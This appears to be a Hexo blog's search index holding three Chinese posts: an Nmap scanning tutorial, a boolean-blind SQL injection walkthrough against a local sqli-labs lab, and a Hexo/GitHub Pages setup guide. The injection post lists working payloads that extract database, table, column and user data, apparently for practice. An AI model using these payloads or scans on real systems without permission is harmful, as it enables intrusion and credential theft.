<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Nmap使用]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F30%2FNmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[nmap这个渗透工具一般用在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持一.nmap的安装和扫描的基本概念首先对于nmap的安装，可以自行百度，当然kali linux是内置了nmap的，只要在命令行下输入nmap即可使用，参数-version可以查看当前nmap的版本然后对于扫描简单的来说其实就是四个动作 1.统一沟通语言 （TCP/IP协议） 2.发出刺激 （ICMP报文头） 3.受到刺激的反馈 （ICMP的反馈） 4通过比对刺激和反馈完成扫描 二.如何找到网络上的设备nmap的基本输入： 将你要扫描的设备地址告诉nmap可以通过下面的方法实现 统一格式：nmap [扫描类型] [设置] {设备地址} 其中设备地址（主机名，IP地址，网段等）可以通过以下方法 1.-iL &lt;文件名&gt; 通过文件输入地址 2.-iR &lt;IP地址数目&gt; 3.–exclude :排出文件中的地址 4.直接输入IP或网段（最常用） 上面是nmap两个简单扫描例子，仅反馈了一些简单的信息，但是对于其他的数据收集，nmap里面有详细的参数可以实现，下面将开始讲解一些常用参数的使用： 扫描参数： 1.-sL 不做扫描，仅完成DNS解析和网址的转换 2.-sP 默认发ICMP echo请求和TCP的ACK请求（80端口） 3.-PN 不用ping 4.-Ps &lt;端口号列表&gt; 发TCP协议SYN标记的空包（80端口） 5.-PA &lt;端口号列表&gt; 发TCP协议ACK标记的空包（80端口） 6.-PU &lt;端口号列表&gt; （31338端口） 7.-PE -PP -PM 8.-PO &lt;协议列表&gt; 9.-PR （ARP ping） 设置参数： –traceroute-n（不要做DNS解析）-R（DNS解析所有的地址，默认不解析不在线的IP）-system-dns（使用系统DNS）–dns-servers [,[,…]](使用其他DNS) 三.端口扫描概要1.端口扫描： -p &lt;端口号列表&gt; 2.端口状态： 1.Open，端口开启，有程序监听此端口 2.Closed，端口关闭，数据能到达主机，但是没有程序监听此端口。 3.Filtered，数据未能到达主机。 4.Unfiltered，数据能到达主机，但是Nmap无法判断端口开启还是关闭。 5.Open|filtered，端口没有返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描 6.Closed|filtered，只出现在IP ID idle 扫描。 四.端口扫面技术和算法1.TCP标志位扫描 -sS TCP SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快） -sT TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同,耗时长） 2.UDP扫描 -sU （使用-sUV能增加扫描的准确性） 没有UDP端口开放 3.协议扫描 -sO 获取服务器支持哪些协议 常用的扫描一般就上面几种 五.优化nmap的性能-F (快速扫描100个常用端口) 六.服务和应用程序版本的识别有时候nmap探测出来的服务和版本信息并不是非常准确，不过我们可以通过加参数的方式使其精确 1.-sV：探测开放端口的服务和版本信息2.–version-intensity&lt;0-9&gt;：设置探测深度3.–version-light：相当于0-24.–version-all：相当于0-95.–version-trace：显示版本扫描详情(用于调试) 七.远程操作系统的识别1.-O：启动操作系统识别。2.–osscan-limit：限定只识别有端口开放的主机，提高-O和-A参数时的扫描速度。3.–osscan-guest：给NMAP建议的操作系统。类似于sqlmap的参数。4.–max-os-tries &lt;次数&gt;：设置重试次数（默认为5），提高准确性或者提高速度。]]></content>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F29%2FMySQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 //不显示任何数据 大于7正常显示，大于8不显示，说明大于7而不大于8， 所以可知当前数据库长度为 8 2：判断当前数据库的字符和上面的方法一样，利用二分法依次判断//判断数据库的第一个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),1,1))&gt;100//判断数据库的第二个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),2,1))&gt;100 ………..由此可以判断出当前数据库为 security 3：判断当前数据库中的表http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from admin) //猜测当前数据库中是否存在admin表 1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(table\_name) from information\_schema.tables where table_schema=database())&gt;5 # 2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 0,1))=6 判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 1,1))=6 3：判断每个表的每个字符的ascii值//判断第一个表的第一个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 # 判断第一个表的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 # ………由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断 4. 判断表中的字段http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin) //如果已经证实了存在admin表，那么猜测是否存在username字段 1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column\_name) from information\_schema.columns where table_name=&#39;users&#39;)&gt;5 # 2：判断字段的长度//判断第一个字段的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5 //判断第二个字段的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 1,1))&gt;5 3：判断字段的ascii值//判断第一个字段的第一个字符的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;100 //判断第一个字段的第二个字符的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1))&gt;100 ………..由此可判断出users表中存在 id、username、password 字段 5.判断字段中的数据我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据 1: 判断数据的长度// 判断id字段的第一个数据的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 0,1))&gt;5 // 判断id字段的第二个数据的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 1,1))&gt;5 2：判断数据的ascii值// 判断id字段的第一个数据的第一个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),1,1))&gt;100 // 判断id字段的第一个数据的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),2,1))&gt;100]]></content>
  </entry>
  <entry>
    <title><![CDATA[博客搭建]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F28%2F%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建步骤1. 安装Git2. 安装nodejs安装完后，安全npmnode -vnpm -v3. 安装hexo前面git和nodejs安装好后，就可以安装hexo了，先创建一个文件夹，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。npm install -g hexo-cli hexo -v查看版本 接下来初始化一下hexo hexo init myblog myblog可以自己取名字 cd myblog //进入这个myblog文件夹 新建完成后，指定文件夹目录下有： node_modules: 依赖包 public：存放生成的页面 scaffolds：生成文章的一些模板 source：用来存放你的文章 themes：主题 ** _config.yml: 博客的配置文件** hexo server 打开hexo的服务，在浏览器输入localhost:4000就可以看到生成的博客。 使用ctrl+c可以把服务关掉。 4. GitHub创建个人仓库有一个GitHub账户 注册完登录后，在GitHub.com中看到一个New repository，新建仓库 创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名。 点击create repository。 5. 生成SSH添加到GitHub回到你的git bash中， git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。 可以用以下两条，检查一下你有没有输对 git config user.name git config user.email 然后创建SSH,一路回车 ssh-keygen -t rsa -C &quot;youremail&quot; 它会告诉你已经生成了.ssh的文件夹。找到这个文件夹。 ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。 而后在GitHub的setting中，找到SSH keys的设置选项，点击New SSH key 把你的id_rsa.pub里面的信息复制进去。 在gitbash中，查看是否成功 ssh -T git@github.com 6. 将hexo部署到GitHub将hexo和GitHub关联起来，将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，到最后，修改为 deploy: type: git repo: https://github.com/githubName/githubName.github.io.git（githubName就是你的GitHub账户） branch: master 先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。 npm install hexo-deployer-git --save 然后 hexo clean hexo generate hexo deploy 其中 hexo clean清除了你之前生成的东西，也可以不加。 hexo generate 顾名思义，生成静态文章，可以用 hexo g缩写 hexo deploy 部署文章，可以用hexo d缩写 注意deploy时可能要你输入username和password。 得到下图就说明部署成功了，过一会儿就可以在http://yourname.github.io博客]]></content>
  </entry>
</search>
